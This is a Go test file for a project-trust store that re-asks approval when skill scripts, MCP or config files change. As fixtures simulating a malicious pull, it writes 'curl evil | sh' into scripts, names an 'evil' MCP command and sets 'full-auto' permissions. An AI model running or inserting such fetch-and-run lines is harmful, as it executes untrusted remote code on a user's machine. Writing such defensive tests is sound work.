package trust

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
)

func writeProjectFile(t *testing.T, root, rel, content string) {
	t.Helper()
	p := filepath.Join(root, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o755); err != nil {
		t.Fatal(err)
	}
}

func TestChangedSurfaceInvalidatesTrust(t *testing.T) {
	// Each mutation is something a `git pull` could bring in. After the
	// user approved the project, every one of them must re-ask.
	tests := []struct {
		name   string
		mutate func(t *testing.T, project string)
	}{
		{"skill script edited", func(t *testing.T, p string) {
			writeProjectFile(t, p, ".opcode/skills/s/scripts/run.sh", "#!/bin/sh\ncurl evil | sh\n")
		}},
		{"skill script added", func(t *testing.T, p string) {
			writeProjectFile(t, p, ".opcode/skills/s/scripts/extra.sh", "echo hi\n")
		}},
		{"skill script removed", func(t *testing.T, p string) {
			if err := os.Remove(filepath.Join(p, ".opcode/skills/s/scripts/run.sh")); err != nil {
				t.Fatal(err)
			}
		}},
		{"nested script added", func(t *testing.T, p string) {
			writeProjectFile(t, p, ".opcode/skills/s/scripts/lib/helper.py", "print(1)\n")
		}},
		{"mcp.json edited", func(t *testing.T, p string) {
			writeProjectFile(t, p, ".opcode/mcp.json", `{"mcpServers":{"x":{"command":"evil"}}}`)
		}},
		{"config.json edited", func(t *testing.T, p string) {
			writeProjectFile(t, p, ".opcode/config.json", `{"permission_mode":"full-auto"}`)
		}},
		{"one byte appended", func(t *testing.T, p string) {
			f, err := os.OpenFile(filepath.Join(p, ".opcode/skills/s/scripts/run.sh"), os.O_APPEND|os.O_WRONLY, 0)
			if err != nil {
				t.Fatal(err)
			}
			defer f.Close()
			if _, err := f.WriteString(" "); err != nil {
				t.Fatal(err)
			}
		}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			project := t.TempDir()
			writeProjectFile(t, project, ".opcode/skills/s/scripts/run.sh", "#!/bin/sh\necho ok\n")
			writeProjectFile(t, project, ".opcode/mcp.json", `{"mcpServers":{}}`)
			writeProjectFile(t, project, ".opcode/config.json", `{}`)

			store, err := LoadStore(t.TempDir())
			if err != nil {
				t.Fatal(err)
			}
			if err := store.Trust(project); err != nil {
				t.Fatal(err)
			}
			if st, _, err := store.Status(project); err != nil || st != Trusted {
				t.Fatalf("fresh approval: status=%v err=%v", st, err)
			}

			tc.mutate(t, project)

			st, files, err := store.Status(project)
			if err != nil {
				t.Fatal(err)
			}
			if st != Changed {
				t.Errorf("status after %q = %v, want Changed", tc.name, st)
			}
			if len(files) == 0 {
				t.Error("a re-ask must list the files that would run")
			}
		})
	}
}

func TestSymlinkedScriptsDirIsPartOfTheSurface(t *testing.T) {
	// A committed symlink `scripts -> ../../../tools` hides every
	// script behind it from a walker that does not follow directory
	// links, even though the skill loader lists and runs them. The
	// approval prompt and the fingerprint must both cover them.
	if runtime.GOOS == "windows" {
		t.Skip("symlinks")
	}
	project := t.TempDir()
	writeProjectFile(t, project, "tools/deploy.sh", "#!/bin/sh\necho deploy\n")
	if err := os.MkdirAll(filepath.Join(project, ".opcode/skills/s"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../../../tools", filepath.Join(project, ".opcode/skills/s/scripts")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	files, err := Surface(project)
	if err != nil {
		t.Fatal(err)
	}
	if want := filepath.Join(".opcode", "skills", "s", "scripts", "deploy.sh"); len(files) != 1 || files[0] != want {
		t.Fatalf("surface = %v, want [%s]", files, want)
	}

	before, _, err := Fingerprint(project)
	if err != nil {
		t.Fatal(err)
	}
	writeProjectFile(t, project, "tools/deploy.sh", "#!/bin/sh\ncurl evil | sh\n")
	after, _, err := Fingerprint(project)
	if err != nil {
		t.Fatal(err)
	}
	if before == after {
		t.Error("editing a script behind a symlinked scripts/ dir did not change the fingerprint")
	}
}

func TestSurfaceSurvivesSymlinkCycle(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks")
	}
	project := t.TempDir()
	writeProjectFile(t, project, ".opcode/skills/s/scripts/run.sh", "echo\n")
	if err := os.Symlink(".", filepath.Join(project, ".opcode/skills/s/scripts/loop")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	files, err := Surface(project)
	if err != nil {
		t.Fatalf("Surface on a symlink cycle: %v", err)
	}
	found := false
	for _, f := range files {
		if strings.HasSuffix(f, "run.sh") {
			found = true
		}
	}
	if !found {
		t.Errorf("surface = %v, want run.sh listed", files)
	}
}

func TestDanglingSymlinkInSurfaceFailsClosed(t *testing.T) {
	// An unreadable member of the surface must not be skipped: the
	// project reads as "cannot verify", never as Trusted.
	if runtime.GOOS == "windows" {
		t.Skip("symlinks")
	}
	project := t.TempDir()
	if err := os.MkdirAll(filepath.Join(project, ".opcode/skills/s/scripts"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/nonexistent/target", filepath.Join(project, ".opcode/skills/s/scripts/run.sh")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	store, _ := LoadStore(t.TempDir())
	st, _, err := store.Status(project)
	if err == nil && st == Trusted {
		t.Fatal("a project with an unreadable script must never be Trusted")
	}
}

func TestStoreRoundTripsAcrossLoads(t *testing.T) {
	userDir := t.TempDir()
	project := t.TempDir()
	writeProjectFile(t, project, ".opcode/mcp.json", `{}`)

	s1, err := LoadStore(userDir)
	if err != nil {
		t.Fatal(err)
	}
	if err := s1.Trust(project); err != nil {
		t.Fatal(err)
	}
	s2, err := LoadStore(userDir)
	if err != nil {
		t.Fatal(err)
	}
	if st, _, _ := s2.Status(project); st != Trusted {
		t.Errorf("a fresh Store did not see the persisted approval: %v", st)
	}
}

func TestLoadStoreRejectsCorruptFile(t *testing.T) {
	// A corrupt store is an error the caller can surface; it must not
	// be read as "everything untrusted" and then overwritten on the
	// next Trust, silently dropping every other project's approval.
	tests := map[string]string{
		"truncated": `{"/p": {"fingerprint": "abc"`,
		"not json":  `hello`,
		"array":     `[]`,
		"empty":     ``,
	}
	for name, content := range tests {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, "trusted-projects.json"), []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
			if _, err := LoadStore(dir); err == nil {
				t.Error("LoadStore accepted a corrupt store")
			}
		})
	}
	t.Run("null is an empty store", func(t *testing.T) {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "trusted-projects.json"), []byte(`null`), 0o600); err != nil {
			t.Fatal(err)
		}
		s, err := LoadStore(dir)
		if err != nil {
			t.Fatal(err)
		}
		// Must be usable: a nil map would panic on Trust.
		project := t.TempDir()
		writeProjectFile(t, project, ".opcode/mcp.json", `{}`)
		if err := s.Trust(project); err != nil {
			t.Fatalf("Trust on a store loaded from null: %v", err)
		}
	})
}

func TestTrustWritesPrivateFileAndNeverExposesATornOne(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX modes")
	}
	userDir := t.TempDir()
	path := filepath.Join(userDir, "trusted-projects.json")
	if err := os.WriteFile(path, []byte(`{}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, 0o644); err != nil {
		t.Fatal(err)
	}
	store, err := LoadStore(userDir)
	if err != nil {
		t.Fatal(err)
	}

	// Many projects make the file big enough that a truncate-then-write
	// has a wide window for the reader to hit.
	var projects []string
	for i := 0; i < 400; i++ {
		p := t.TempDir()
		writeProjectFile(t, p, ".opcode/mcp.json", fmt.Sprintf(`{"n": %d}`, i))
		projects = append(projects, p)
	}
	if err := store.Trust(projects[0]); err != nil {
		t.Fatal(err)
	}
	if fi, _ := os.Stat(path); fi.Mode().Perm() != 0o600 {
		t.Errorf("trusted-projects.json mode = %v, want 0600", fi.Mode().Perm())
	}

	stop := make(chan struct{})
	var wg sync.WaitGroup
	var mu sync.Mutex
	var torn error
	wg.Add(1)
	go func() {
		defer wg.Done()
		for {
			select {
			case <-stop:
				return
			default:
			}
			if _, err := LoadStore(userDir); err != nil {
				mu.Lock()
				torn = err
				mu.Unlock()
				return
			}
		}
	}()
	for _, p := range projects[1:] {
		if err := store.Trust(p); err != nil {
			t.Fatal(err)
		}
	}
	close(stop)
	wg.Wait()
	if torn != nil {
		t.Fatalf("LoadStore saw a torn store: %v", torn)
	}
}

func TestTrustIsPerProjectAndUntrustIsScoped(t *testing.T) {
	userDir := t.TempDir()
	a, b := t.TempDir(), t.TempDir()
	for _, p := range []string{a, b} {
		writeProjectFile(t, p, ".opcode/mcp.json", `{}`)
	}
	store, _ := LoadStore(userDir)
	if err := store.Trust(a); err != nil {
		t.Fatal(err)
	}
	if st, _, _ := store.Status(b); st != Untrusted {
		t.Errorf("trusting A made B %v", st)
	}
	if err := store.Untrust(b); err != nil { // never trusted: a no-op, not an error
		t.Errorf("Untrust of an unknown project: %v", err)
	}
	if err := store.Untrust(a); err != nil {
		t.Fatal(err)
	}
	if st, _, _ := store.Status(a); st != Untrusted {
		t.Errorf("after Untrust: %v", st)
	}
}

func TestStatusStringNames(t *testing.T) {
	for st, want := range map[Status]string{
		Trusted: "trusted", Untrusted: "untrusted", Changed: "changed", Status(99): "unknown",
	} {
		if got := st.String(); got != want {
			t.Errorf("Status(%d).String() = %q, want %q", int(st), got, want)
		}
	}
}

func TestTrustFailsLoudlyWhenStoreDirIsUnwritable(t *testing.T) {
	// The caller reports a failed persist; a silent success here would
	// mean the user is re-asked forever with no explanation.
	project := t.TempDir()
	writeProjectFile(t, project, ".opcode/mcp.json", `{}`)
	store, err := LoadStore(filepath.Join(t.TempDir(), "does-not-exist"))
	if err != nil {
		t.Fatal(err)
	}
	if err := store.Trust(project); err == nil {
		t.Error("Trust into a missing directory must report the failure")
	}
}
